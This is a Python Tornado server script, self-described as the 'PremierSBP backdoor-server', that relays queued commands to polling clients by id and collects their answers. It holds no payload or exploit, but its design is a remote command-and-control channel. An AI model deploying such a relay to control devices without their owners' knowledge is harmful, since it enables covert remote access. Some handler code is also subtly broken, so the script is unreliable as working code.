#!/usr/bin/env python3

import signal
import tornado.httpserver
import tornado.ioloop
import tornado.web
from tornado import gen
from tornado.concurrent import Future

import config
from utilities.extra import logger
from utilities.service import status_error, status_ok
from utilities.string import green, red, yellow

# def isonis_lokacija(device):
# 	data = {
# 		'last_ping': str(datetime.datetime.now().replace(microsecond=0)),
# 		'username' : device
# 	}
# 	rdb = redis.Redis(host=REDIS_HOST, port=REDIS_PORT, password=REDIS_PASSWORD, db=5)
# 	rdb.set('isonis-lokacija-{}'.format(device), json.dumps(data, ensure_ascii=False))


class MessageBuffer(object):
	def __init__(self):
		self.waiters = set()
		self.cache = []
		self.cache_size = 1000
	
	def wait_for_messages(self):
		result_future = Future()
		self.waiters.add(result_future)
		return result_future
	
	def cancel_wait(self, future):
		self.waiters.remove(future)
		future.set_result([])
	
	def new_messages(self, messages):
		for future in self.waiters:
			future.set_result(messages)
		self.waiters = set()
		self.cache.extend(messages)
		if len(self.cache) > self.cache_size:
			self.cache = self.cache[-self.cache_size:]


global_message_buffer = MessageBuffer()


class AnswearHandler(tornado.web.RequestHandler):
	
	def parse_arguments(self):
		response = {}
		for arg in self.request.arguments:
			try:
				response[arg] = self.request.arguments[arg][0].decode('utf-8')
			except:
				response[arg] = self.request.arguments[arg][0]
		return response
	
	def post(self):
		args = self.parse_arguments()
		print(args)
		self.write(status_ok())


class PollHandler(tornado.web.RequestHandler):
	
	def parse_arguments(self):
		response = {}
		for arg in self.request.arguments:
			try:
				response[arg] = self.request.arguments[arg][0].decode('utf-8')
			except:
				response[arg] = self.request.arguments[arg][0]
		return response
	
	@gen.coroutine
	def post(self):
		
		args = self.parse_arguments()
		id_client = args.get('id_client')
		
		if not id_client:
			self.write(status_error('missing id_client'))
		
		print(yellow("[*] connected {}".format(id_client)))
		log.info("connected {}".format(id_client))
		
		while True:
			self.future = global_message_buffer.wait_for_messages()
			
			msgs = yield self.future
			if self.request.connection.stream.closed():
				print("Stream closed")
				return
			
			if msgs and len(msgs) > 0:
				msg = msgs[0]
				if "id_client" in msg and (msg["id_client"] == id_client or msg["id_client"] == "__all__"):
					self.write(status_ok(msg))
					break
			self.finish()

			
class MessageSendHandler(tornado.web.RequestHandler):
	
	def parse_arguments(self):
		response = {}
		for arg in self.request.arguments:
			try:
				response[arg] = self.request.arguments[arg][0].decode('utf-8')
			except:
				response[arg] = self.request.arguments[arg][0]
		return response
	
	def post(self):
		
		args = self.parse_arguments()
		
		id_client = args.get('id_client')
		command = args.get('command')
		if not id_client:
			return self.write(status_error("Invalid message, missing `id_client`"))
		
		if not command:
			return self.write(status_error("Invalid message, missing `command`"))
		
		global_message_buffer.new_messages([args])
		
		self.write(status_ok())


application = tornado.web.Application([
		(r"/poll", PollHandler),
		(r"/send", MessageSendHandler),
		(r"/answer", AnswearHandler)
	],
	cookie_secret=config.SECRET_COOKIE,
)
if __name__ == "__main__":
	
	log = logger('backdoor-service')
	
	print(green("[*] PremierSBP backdoor-server service started on {}".format(config.BACKDOOR_SERVER_PORT)))
	log.info("PremierSBP backdoor-server service started on {}".format(config.BACKDOOR_SERVER_PORT))
	try:
		app = tornado.httpserver.HTTPServer(application)
		
		
		def signal_handler(sig, frame):
			def _shutdown(server):
				log.info('Stopping server')
				server.stop()
				log.info('Shutting down')
				tornado.ioloop.IOLoop.instance().stop()
				log.info('Shut down')
			
			tornado.ioloop.IOLoop.instance().add_callback_from_signal(_shutdown, app)
		
		
		signal.signal(signal.SIGINT, signal_handler)
		signal.signal(signal.SIGTERM, signal_handler)
		
		app.listen(config.BACKDOOR_SERVER_PORT)
		tornado.ioloop.IOLoop.current().start()
	
	except Exception as e:
		print(red(e))
		log.critical(e)
